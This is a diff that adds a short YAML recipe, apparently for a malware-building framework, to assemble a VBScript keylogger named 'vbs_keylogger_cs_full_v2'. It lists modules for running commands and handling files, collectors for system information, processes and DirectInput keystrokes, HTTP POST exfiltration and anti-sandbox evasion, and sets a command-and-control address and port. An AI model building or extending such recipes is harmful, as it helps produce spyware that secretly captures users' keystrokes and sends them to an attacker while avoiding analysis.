@@ -1,0 +1,19 @@
+name: vbs_keylogger_cs_full_v2
+description: Auto-generated recipe by Hermes (vbscript)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info
+- collectors/processes
+- collectors/keylogger_directinput
+exfil: exfil/http_post
+arch: arch/sequential
+resources: true
+evasion:
+- evasion/anti_sandbox
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: 9001
+  KEYLOG_INTERVAL: '500'
